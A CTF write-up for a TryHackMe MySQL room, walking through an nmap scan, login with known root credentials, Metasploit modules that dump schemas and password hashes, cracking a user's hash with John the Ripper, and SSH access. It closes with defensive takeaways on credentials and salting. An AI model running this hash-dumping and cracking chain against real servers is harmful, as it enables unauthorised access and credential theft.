---
title: Enum and Exploit of MySQL
date: 2024-10-20
categories:
  - ctf
  - database
tags:
  - enumeration
  - hash cracking
  - mysql
draft: false
image: /img/banner/mysql_exploitation.png
layout: blog-post
toc: true
---

>[!Reference]
[ðŸ’» TryHackMe CTF Room](https://tryhackme.com/r/room/networkservices2)


### Initial Reconnaissance

The first step in exploiting a MySQL database is identifying whether the target machine has an exposed MySQL port. By default, MySQL runs on port 3306, but this can be customized by the system administrator, so it's important to scan for common open ports. Typically you can attempt to connect to the MySQL server using common credentials or perform a brute force attack if no rate-limiting is in place.

Example Nmap Scan: *(NFS Scan highlighted)*

```bash
root@ip-10-10-22-136:~# IP=10.10.190.97
root@ip-10-10-22-136:~# nmap -sS -T4 -F -oN output.txt $IP

Starting Nmap 7.60 ( https://nmap.org ) at 2024-10-06 02:34 BST
Nmap scan report for ip-10-10-244-95.eu-west-1.compute.internal (10.10.244.95)
Host is up (0.0012s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
3306/tcp open  mysql
MAC Address: 02:59:70:A7:8E:95 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.67 seconds
```

> [!Code]
> The call above uses the flag **-sS** to perform a stealthy SYN scan, which is faster and less detectable than a full connection scan. The **-T4** flag sets the timing template to be faster than the default, balancing speed and accuracy. The **-F** flag specifies a fast scan that targets the top 100 most common ports. The **-oN output.txt** flag saves the scan results in a normal format to a file named **output.txt**. Finally, **\$IP** specifies the target IP address for the scan.

#### Using stolen credentials

For this box we already know the credentials of the MySQL server ```username: root``` and ```password:password``` obtained previously and we'll be using this to gain further access on the server. Once connected and authenticated using the credentials we can enumerate the database to gather more information about the system. 

```bash
root@ip-10-10-22-136:~# username=root
root@ip-10-10-22-136:~#  mysql -h $IP -u $username -p
Enter password: password
```
### Enumeration

We'll be using modules from Metasploit to extract information from the database. First thing we'll do is submit an authenticated request to show the databases present on the MySQL server. We can do this by setting the ```RHOSTS, USERNAME, PASSWORD``` to the ip and credentials of the server and by initiating the SQL ```show databases``` query command. 

```bash
msfconsole
msf6 > use auxiliary/admin/mysql/mysql_sql
msf6 auxiliary(admin/mysql/mysql_sql) > set RHOSTS 10.10.244.95
msf6 auxiliary(admin/mysql/mysql_sql) > set USERNAME root
msf6 auxiliary(admin/mysql/mysql_sql) > set PASSWORD password
msf6 auxiliary(admin/mysql/mysql_sql) > set SQL show databases
msf6 auxiliary(admin/mysql/mysql_sql) > options

Module options (auxiliary/admin/mysql/mysql_sql):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------
   SQL   show databases   yes       The SQL to execute.


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  password         no        The password for the specified username
   RHOSTS    10.10.244.95     no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     3306             no        The target port (TCP)
   USERNAME  root             no        The username to authenticate as

msf6 auxiliary(admin/mysql/mysql_sql) > run

[*] Running module against 10.10.244.95

[*] 10.10.244.95:3306 - Sending statement: 'show databases'...
[*] 10.10.244.95:3306 -  | information_schema |
[*] 10.10.244.95:3306 -  | mysql |
[*] 10.10.244.95:3306 -  | performance_schema |
[*] 10.10.244.95:3306 -  | sys |
[*] Auxiliary module execution completed
```

#### Reading MySQL Database

We can further analyze the structure of the MySQL database by dumping the schema of all tables using the Metasploit module ```mysql_schemadump```. This module allows us to retrieve the database schema, which includes detailed information about the structure of the databases, tables, columns, data types, and relationships between different tables within the MySQL server. This information can be critical for targeted exploitation. For example, knowing the names and structures of the tables enables us to focus on tables that likely contain sensitive information, such as ```users, passwords, sessions, or admin```.

```bash
msf6 > use auxiliary/admin/mysql/mysql_schemadump
msf6 auxiliary(admin/mysql/mysql_schemadump) > set RHOSTS 10.10.244.95
msf6 auxiliary(admin/mysql/mysql_schemadump) > set USERNAME root
msf6 auxiliary(admin/mysql/mysql_schemadump) > set PASSWORD password
msf6 auxiliary(admin/mysql/mysql_schemadump) > options

Module options (auxiliary/scanner/mysql/mysql_schemadump):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   DISPLAY_RESULTS  true             yes       Display the Results to the Screen


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  password         no        The password for the specified username
   RHOSTS    10.10.244.95     no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     3306             no        The target port (TCP)
   THREADS   1                yes       The number of concurrent threads (maxone per host)
   USERNAME  root             no        The username to authenticate as

msf6 auxiliary(admin/mysql/mysql_schemadump) > run

- TableName: x$waits_global_by_latency
    Columns:
    - ColumnName: events
      ColumnType: varchar(128)
    - ColumnName: total
      ColumnType: bigint(20) unsigned
    - ColumnName: total_latency
      ColumnType: bigint(20) unsigned
    - ColumnName: avg_latency
      ColumnType: bigint(20) unsigned
    - ColumnName: max_latency
      ColumnType: bigint(20) unsigned

[*] 10.10.244.95:3306 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### MySQL Hashdump

We will also use the ```mysql_hashdump``` module which is a powerful tool used to extract password hashes from a MySQL server, which can then be leveraged for further attacks. By using this module, attackers can retrieve hashed password values stored within the MySQL user table, typically located in the user table. In this case we were able to identify the entry ```carl``` with its corresponding password hash.

```bash
msf6 > auxiliary/scanner/mysql/mysql_hashdump
msf6 auxiliary(admin/mysql/mysql_hashdump) > set RHOSTS 10.10.244.95
msf6 auxiliary(admin/mysql/mysql_hashdump) > set USERNAME root
msf6 auxiliary(admin/mysql/mysql_hashdump) > set PASSWORD password
msf6 auxiliary(admin/mysql/mysql_hashdump) > options

Module options (auxiliary/scanner/mysql/mysql_hashdump):

   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  password         no        The password for the specified username
   RHOSTS    10.10.244.95     no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     3306             no        The target port (TCP)
   THREADS   1                yes       The number of concurrent threads (max one per host)
   USERNAME  root             no        The username to authenticate as


msf6 auxiliary(admin/mysql/mysql_hashdump) > run

[+] 10.10.244.95:3306 - Saving HashString as Loot: root:
[+] 10.10.244.95:3306 - Saving HashString as Loot: mysql.session:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.244.95:3306 - Saving HashString as Loot: mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.244.95:3306 - Saving HashString as Loot: debian-sys-maint:*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E
[+] 10.10.244.95:3306 - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
[+] 10.10.244.95:3306 - Saving HashString as Loot: carl:*EA031893AA21444B170FC2162A56978B8CEECE18
[*] 10.10.244.95:3306 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Cracking the Hash

We can use John the Ripper, a popular password-cracking tool, to reverse-engineer the hash into its original ASCII format. John the Ripper works by taking the hashed password and comparing it against a large set of potential plaintext passwords, which are hashed in the same algorithm. If it finds a match, it reveals the original password.

```bash
root@ip-10-10-22-136:~# echo carl:*EA031893AA21444B170FC2162A56978B8CEECE18 > hash.txt
root@ip-10-10-22-136:~# john hash.txt

Proceeding with wordlist:/opt/john/password.lst
Proceeding with incremental:ASCII
doggie           (carl)
1g 0:00:00:02 DONE 3/3 (2024-10-06 02:57) 0.4566g/s 1043Kp/s 1043Kc/s 1043KC/s doggie..doggia
```

> [!Code]
> The call above uses John the Ripper in its default configuration, utilizing a built-in word list to attempt to crack the single password hash stored in the text file."
### Accessing the MySQL Server

Having access to the username and password allows us to SSH directly into the server and gain access to its resources directly.

```bash
root@ip-10-10-22-136:~# ssh carl@10.10.244.95
carl@10.10.244.95's password: doggie

Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64)
carl@polomysql:~$
```

### Takeaways

- **Credential-Based Exploitation:** Gaining access to MySQL using known credentials (like root with a weak password) can lead to control over the database and server, emphasizing the importance of strong, unique credentials and limiting root access.

- **Metasploit Modules as Recon Tools:** Metasploit's mysql_schemadump and mysql_hashdump modules are effective for looking into database structure and extracting sensitive data like password hashes.

- **Importance of Salting:** Salting passwords before hashing significantly strengthens security by making brute force and rainbow table attacks impractical, as each password hash becomes unique, removing the effectiveness of tools like John the Ripper. This highlights the importance of using salts in password storage to mitigate hash-cracking attacks.